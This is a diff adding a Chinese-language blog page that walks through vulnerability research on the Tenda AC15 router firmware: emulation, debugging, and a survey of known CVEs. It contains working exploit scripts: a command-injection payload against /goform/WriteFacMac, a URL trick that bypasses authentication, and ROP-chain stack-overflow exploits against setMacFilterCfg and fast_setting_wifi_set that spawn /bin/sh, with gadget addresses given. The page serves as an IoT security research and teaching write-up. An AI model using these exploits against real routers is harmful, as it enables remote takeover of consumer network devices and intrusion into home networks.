@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Tenda AC15 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Tenda AC15</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-07-17 20:48:33
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                    #IOT安全
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/" title="路由器安全">
+                    #路由器安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Tenda-AC15研究历程"><a href="#Tenda-AC15研究历程" class="headerlink" title="Tenda AC15研究历程"></a>Tenda AC15研究历程</h1><h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><p><strong>获取固件</strong></p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;down.tendacn.com&#x2F;uploadfile&#x2F;AC15&#x2F;US_AC15V1.0BR_V15.03.05.20_multi_TDE01.zip</code></pre>
+
+
+
+<p><strong>提取固件</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-Me</span> AC15.bin</code></pre>
+
+<p>获得固件文件系统squashfs</p>
+<h2 id="固件分析与模拟"><a href="#固件分析与模拟" class="headerlink" title="固件分析与模拟"></a>固件分析与模拟</h2><p>一般来说，都会去分析http相关的程序：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token string">"http"</span> <span class="token operator">></span> <span class="token punctuation">..</span>/http.txt
+
+<span class="token comment">#在http.txt中找到目标http程序</span></code></pre>
+
+<p>对其进行分析：</p>
+<pre class="language-none"><code class="language-none">.&#x2F;bin&#x2F;httpd</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220706154213952.png"></p>
+<p>我们首先就需要尝试能不能模拟该程序：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-arm-static <span class="token parameter variable">-L</span> ./ ./bin/httpd</code></pre>
+
+<p>发现并不成功，IDA打开程序，定位至主函数，发现了启动该程序需要几个条件：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220706155518377.png"></p>
+<p>一个是check_network函数判断</p>
+<p>一个是ConnectCfm函数判断</p>
+<p>那我们就需要将这两个判断条件patch掉即可（修复）：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220711140704459.png"></p>
+<p>patch完之后再进行模拟，成功启动，但是程序启动后的IP不太对，根据一个师傅的文章得知：</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;blog.csdn.net&#x2F;song_lee&#x2F;article&#x2F;details&#x2F;113800058</code></pre>
+
+<p>网卡配置信息需要check_network函数&#x3D;&#x3D;》该函数定义在libccommon.so中&#x3D;&#x3D;》</p>
+<p>check_network调用了函数getLanName&#x3D;&#x3D;》getLanName又调用了外部函数get_eth_name函数</p>
+<p>&#x3D;&#x3D;》这个外部函数定义在libcChipApi.so中，并且该函数就是为了获取网卡信息&#x3D;&#x3D;》网卡顺序：br0, br1, eth0.1, eth0.2&#x3D;&#x3D;》</p>
+<p>所以我们只需要自定义添加一个br0网卡即可：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> tunctl <span class="token parameter variable">-t</span> br0 <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>username<span class="token operator">></span>
+<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 <span class="token number">192.168</span>.80.1/24</code></pre>
+
+<p>再次模拟运行httpd程序：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715150654593.png"></p>
+<p>（成功）</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>只需要在模拟程序的时候加一个监听端口即可</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#终端1</span>
+<span class="token function">sudo</span> qemu-arm-static <span class="token parameter variable">-g</span> <span class="token number">1234</span> <span class="token parameter variable">-L</span> ./ ./bin/httpd
+
+<span class="token comment">#终端2</span>
+<span class="token builtin class-name">set</span> sysroot <span class="token operator">&lt;</span>固件目录<span class="token operator">></span>
+<span class="token function">file</span> <span class="token operator">&lt;</span>目标程序所在路径<span class="token operator">></span>
+target remote :1234</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715151142725.png"></p>
+<h2 id="漏洞搜集"><a href="#漏洞搜集" class="headerlink" title="漏洞搜集"></a>漏洞搜集</h2><p>寻找一些漏洞分析一下（不一定需要同版本，反正只是借鉴一下）</p>
+<h3 id="CVE-2018-18729"><a href="#CVE-2018-18729" class="headerlink" title="CVE-2018-18729"></a>CVE-2018-18729</h3><p>&#x2F;goform&#x2F;GetParentControlInfo接口的<strong>堆溢出</strong></p>
+<p>数据复制到chunk中没有限制数据长度</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;ZIllR0&#x2F;Routers&#x2F;blob&#x2F;master&#x2F;Tenda&#x2F;heapoverflow1.md</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715202626341.png"></p>
+<h3 id="CVE-2018-28731"><a href="#CVE-2018-28731" class="headerlink" title="CVE-2018-28731"></a>CVE-2018-28731</h3><p>&#x2F;goform&#x2F;addWifiMacFilter接口的<strong>栈溢出</strong></p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;ZIllR0&#x2F;Routers&#x2F;blob&#x2F;master&#x2F;Tenda&#x2F;stack4.md</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715203112265.png"></p>
+<h3 id="CVE-2018-18732"><a href="#CVE-2018-18732" class="headerlink" title="CVE-2018-18732"></a>CVE-2018-18732</h3><p>&#x2F;goform&#x2F;SetSysTimeCfg接口的<strong>栈溢出</strong></p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;ZIllR0&#x2F;Routers&#x2F;blob&#x2F;master&#x2F;Tenda&#x2F;stack2.md</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220714152246659.png"></p>
+<h3 id="CVE-2021-44971"><a href="#CVE-2021-44971" class="headerlink" title="CVE-2021-44971"></a>CVE-2021-44971</h3><p>通过伪造URL实现身份认证绕过</p>
+<pre class="language-none"><code class="language-none">URL带上 img&#x2F;main-logo.ong  即可实现认证绕过</code></pre>
+
+
+
+
+
+<h3 id="CVE-2022-28556"><a href="#CVE-2022-28556" class="headerlink" title="CVE-2022-28556"></a>CVE-2022-28556</h3><p>&#x2F;goform&#x2F;setpptpservercfg接口的<strong>栈溢出</strong></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220714145954212.png"></p>
+<h3 id="CVE-2018-18728，CVE-2022-28557"><a href="#CVE-2018-18728，CVE-2022-28557" class="headerlink" title="CVE-2018-18728，CVE-2022-28557"></a>CVE-2018-18728，CVE-2022-28557</h3><p>两个编号是一样的洞，应该是版本不一样吧</p>
+<p>&#x2F;goform&#x2F;SetSambaCfg接口：<strong>远程代码执行</strong></p>
+<p>通过伪造usbName的值实现命令执行</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220714150102090.png"></p>
+<h3 id="未知编号"><a href="#未知编号" class="headerlink" title="未知编号"></a>未知编号</h3><p>一个我不知道编号但是撞洞的远程代码执行（我没找到编号就试着交了一下，然后就撞了）</p>
+<p>&#x2F;goform&#x2F;WriteFacMac接口的<strong>远程代码执行</strong></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715152558889.png"></p>
+<p><strong>EXP</strong>：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+url <span class="token operator">=</span> <span class="token string">"http://192.168.80.1/goform/WriteFacMac"</span>
+cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span><span class="token string">"password=12345"</span><span class="token punctuation">&#125;</span>
+payload<span class="token operator">=</span><span class="token string">";id"</span>
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"mac"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>
+requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre>
+
+<p><strong>执行效果</strong>：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715152729844.png"></p>
+<h2 id="自己尝试的get-shell："><a href="#自己尝试的get-shell：" class="headerlink" title="自己尝试的get shell："></a>自己尝试的get shell：</h2><h3 id="setMacFilterCfg"><a href="#setMacFilterCfg" class="headerlink" title="setMacFilterCfg"></a>setMacFilterCfg</h3><p>首先反向定位漏洞位置：</p>
+<p>在使用strcpy函数时没用控制数据长度导致<strong>栈溢出</strong></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220711144014950.png"></p>
+<p>位于&#x2F;goform&#x2F;setMacFilterCfg接口：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715153501358.png"></p>
+<p>&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715153532821.png"></p>
+<p>&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220715153557817.png"></p>
+<p>分析：首先是走到setMacFilterCfg函数处，就需要URL为：</p>
+<pre class="language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">"http://192.168.80.1/goform/setMacFilterCfg"</span></code></pre>
+
+<p>然后就是想要到达pwn3的地方，但是首先函数获取一个macFilterType的值，并经过sub_C1F2C函数处理后返回v19&#x3D;&#x3D;》再对v19进行判断，当v19为0时，才能进入else中</p>
+<p>那首先就是要给macFilterType赋值，而这个值要先分析sub_C1F2C函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220716213326832.png"></p>
+<p>我们需要返回为0，就需要过strcmp的判断&#x3D;&#x3D;》需要给macFilterType赋值为black或者white</p>
+<p>&#x3D;&#x3D;》赋值完后我们成功进入了else中，来到pwn3函数</p>
+<p>else的第一条代码就是获取<strong>deviceList</strong>的值并传入pwn3函数中（第二个参数）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717160324706.png"></p>
+<p>传入的pwn参数又会传给pwn2函数，作为第二个参数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717160531752.png"></p>
+<p>&#x3D;&#x3D;》这传入的第二个参数又会作为第一个参数传入pwn1函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717160627953.png"></p>
+<p>在pwn1函数中，该传入的<strong>deviceList</strong>的值会首先使用strchr获取其中的’\r’字符串&#x3D;&#x3D;》</p>
+<p>再将剩余值作为strcpy函数的参数&#x3D;&#x3D;》</p>
+<p>这里发现没有对该数据进行长度限制，直接复制进栈内&#x3D;&#x3D;》<strong>栈溢出</strong></p>
+<p>接下来就是考虑覆盖返回地址了：</p>
+<p>在strcpy结束后就return 0了&#x3D;&#x3D;》寻找对应的汇编（tab）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717165529115.png"></p>
+<p>注意到最后返回是弹出栈中的值为r4，r11，pc寄存器赋值&#x3D;&#x3D;》而我们要控制的则是pc寄存器</p>
+<h4 id="动态调试-1"><a href="#动态调试-1" class="headerlink" title="动态调试"></a>动态调试</h4><p>动态调试的目的就是为了验证我们刚刚的静态分析是否正确，并调试出数据溢出的长度</p>
+<p>首先就是按照静态分析设计POC了：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+url <span class="token operator">=</span> <span class="token string">"http://192.168.80.1/goform/setMacFilterCfg"</span>
+cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span><span class="token string">"password=12345"</span><span class="token punctuation">&#125;</span>
+
+payload<span class="token operator">=</span><span class="token string">"\r"</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">500</span>
+
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"macFilterType"</span><span class="token punctuation">:</span> <span class="token string">"white"</span><span class="token punctuation">,</span> <span class="token string">"deviceList"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>
+requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre>
+
+<p><strong>调试过程</strong></p>
+<p>首先按照上方的步骤启动并监听httpd</p>
+<p>在函数返回处pop下断点</p>
+<pre class="language-none"><code class="language-none">b *0x000C3594</code></pre>
+
+<p>在gdb中按下c，回车启动</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717161644357.png"></p>
+<p>执行两次poc：</p>
+<p>gdb将成功断点于pop处</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717165912497.png"></p>
+<p>单步执行一次，发现了pc回到了pwn2函数</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717171543171.png"></p>
+<p>继续跟进，来到pwn2的返回地址处</p>
+<p>在pwn2return的地方，下一个断点：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717171644821.png"></p>
+<pre class="language-none"><code class="language-none">b *0x000C29EC
+c</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717171737855.png"></p>
+<p>此时我们发现栈中的数据就为我们传入的”a”,并且在单步执行pop后我们就会将pc寄存器覆盖成我们传入的数据</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717171934965.png"></p>
+<p>此时我们已经控制了返回地址，但是我们还不知道溢出的长度</p>
+<p>但是我们看到栈中还有好多”a”未被使用：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717172111547.png"></p>
+<p>这些未被使用的”a”为20*16&#x3D;320&#x3D;&#x3D;》得出需要用到的数据为500-320&#x3D;180</p>
+<p>176为垃圾数据，接下来就为pc寄存器了（返回地址）</p>
+<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>控制了程序执行流，接下来就是ROP了</p>
+<p>一般来说，需要从libc中寻找ROPgadget（.&#x2F;lib&#x2F;libc.so.2）</p>
+<p>所以就需要libc的基地址&#x3D;&#x3D;》在gdb中走到调用liibc函数的地址处，减去在libc中的偏移就是libc的基地址</p>
+<p>我这里是：</p>
+<pre class="language-python" data-language="python"><code class="language-python">libcbase<span class="token operator">=</span><span class="token number">0x409f5000</span></code></pre>
+
+<p>最后要get shell的，那就需要system和”&#x2F;bin&#x2F;sh”</p>
+<pre class="language-python" data-language="python"><code class="language-python">system<span class="token operator">=</span><span class="token number">0x5A270</span>
+command<span class="token operator">=</span><span class="token string">"/bin/sh"</span></code></pre>
+
+<p>在x86的arm中第一参数需要用到的寄存器为r0，所以需要为r0赋值为command</p>
+<p>而command又会传入栈内，那这里就需要一个ROPgadget：将栈中的地址赋给r0</p>
+<p>布置完之后还需要去执行system&#x3D;&#x3D;》这里就需要将栈中的system地址弹出到寄存器中并跳转至该寄存器地址执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#布置r0：</span>
+ROPgadget <span class="token parameter variable">--binary</span> libc.so.0 <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"mov r0, sp ;"</span></code></pre>
+
+<p>找到一个将sp的值传给r0的，还能跳转至r3寄存器的指令</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717195500871.png"></p>
+<p>那接下来就是找将system弹入r3的ROPgadget了：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> libc.so.0 <span class="token parameter variable">--only</span> <span class="token string">"pop|ret"</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"r3"</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717195931225.png"></p>
+<p>剩下的就是布置payload了：</p>
+<pre class="language-python" data-language="python"><code class="language-python">pop_r3_pc<span class="token operator">=</span><span class="token number">0x00018298</span>
+mov_r0_sp<span class="token operator">=</span><span class="token number">0x00040cb8</span>
+gadget1<span class="token operator">=</span>libcbase<span class="token operator">+</span>pop_r3_pc<span class="token comment">#0x40a0d298</span>
+gadget2<span class="token operator">=</span>libcbase<span class="token operator">+</span>mov_r0_sp<span class="token comment">#0x40a35cb8</span>
+
+payload<span class="token operator">=</span><span class="token string">"\r"</span><span class="token operator">+</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">176</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">+</span>command</code></pre>
+
+
+
+<p>综合一下得到了<strong>EXP</strong>：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+url <span class="token operator">=</span> <span class="token string">"http://192.168.80.1/goform/setMacFilterCfg"</span>
+cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span><span class="token string">"password=12345"</span><span class="token punctuation">&#125;</span>
+
+libcbase<span class="token operator">=</span><span class="token number">0x409f5000</span>
+system<span class="token operator">=</span><span class="token number">0x5A270</span>
+command<span class="token operator">=</span><span class="token string">"/bin/sh"</span>
+pop_r3_pc<span class="token operator">=</span><span class="token number">0x00018298</span>
+mov_r0_sp<span class="token operator">=</span><span class="token number">0x00040cb8</span>
+gadget1<span class="token operator">=</span>libcbase<span class="token operator">+</span>pop_r3_pc<span class="token comment">#0x40a0d298</span>
+gadget2<span class="token operator">=</span>libcbase<span class="token operator">+</span>mov_r0_sp<span class="token comment">#0x40a35cb8</span>
+system<span class="token operator">=</span>libcbase<span class="token operator">+</span>system
+
+payload<span class="token operator">=</span><span class="token string">"\r"</span><span class="token operator">+</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">176</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">+</span>command
+
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"macFilterType"</span><span class="token punctuation">:</span> <span class="token string">"white"</span><span class="token punctuation">,</span> <span class="token string">"deviceList"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>
+requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre>
+
+
+
+<h4 id="EXP调试"><a href="#EXP调试" class="headerlink" title="EXP调试"></a>EXP调试</h4><p>我们直接在gadget1处下断点</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717200352059.png"></p>
+<p>确实劫持到ROPgadget了，并且栈内的sp指向的也是system函数的地址，没有问题</p>
+<p>单步执行（n）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717200551329.png"></p>
+<p>r3寄存器如预期中写入了system函数的地址</p>
+<p>并且此时sp指向的栈内存放着command&#x3D;&#x3D;》接下来就是将command赋值给r0了</p>
+<p>继续单步执行：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717200742269.png"></p>
+<p>r0寄存器也布置好了，接下来就是到r3去执行system函数就可以get shell了：</p>
+<p>直接c继续执行：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717200857134.png"></p>
+<p>看来已经成功getshell了，指向下命令试试：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717200941789.png"></p>
+<h3 id="fast-setting-wifi-set"><a href="#fast-setting-wifi-set" class="headerlink" title="fast_setting_wifi_set"></a>fast_setting_wifi_set</h3><p>我还在fast_setting_wifi_set接口也找到了一个strcpy：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717202216428.png"></p>
+<p>这个更简单了，也没有其他的条件需要绕过，动态调试也和上面setMacFilterCfg接口一样：</p>
+<p>首先就是断点在return处：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717202526240.png"></p>
+<p>一样的计算方法：得到数据溢出长度：124，后面就是返回地址了，ROPgadget不变即可</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+url <span class="token operator">=</span> <span class="token string">"http://192.168.80.1/goform/fast_setting_wifi_set"</span>
+cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span><span class="token string">"password=12345"</span><span class="token punctuation">&#125;</span>
+
+libcbase<span class="token operator">=</span><span class="token number">0x409f5000</span>
+system<span class="token operator">=</span><span class="token number">0x5A270</span>
+command<span class="token operator">=</span><span class="token string">"/bin/sh"</span>
+pop_r3_pc<span class="token operator">=</span><span class="token number">0x00018298</span>
+mov_r0_sp<span class="token operator">=</span><span class="token number">0x00040cb8</span>
+gadget1<span class="token operator">=</span>libcbase<span class="token operator">+</span>pop_r3_pc<span class="token comment">#0x40a0d298</span>
+gadget2<span class="token operator">=</span>libcbase<span class="token operator">+</span>mov_r0_sp<span class="token comment">#0x40a35cb8</span>
+system<span class="token operator">=</span>libcbase<span class="token operator">+</span>system
+
+payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">124</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">+</span>command
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"ssid"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>
+requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre>
+
+
+
+<h4 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220717203012463.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/07/05/setcontext-ORW/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-07-17 20:48:33
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                        #IOT安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/" title="路由器安全">
+                        #路由器安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/09/05/IOT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tenda-AC15%E7%A0%94%E7%A9%B6%E5%8E%86%E7%A8%8B"><span class="toc-text">Tenda AC15研究历程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E8%8E%B7%E5%8F%96"><span class="toc-text">固件获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%A8%A1%E6%8B%9F"><span class="toc-text">固件分析与模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86"><span class="toc-text">漏洞搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-18729"><span class="toc-text">CVE-2018-18729</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-28731"><span class="toc-text">CVE-2018-28731</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-18732"><span 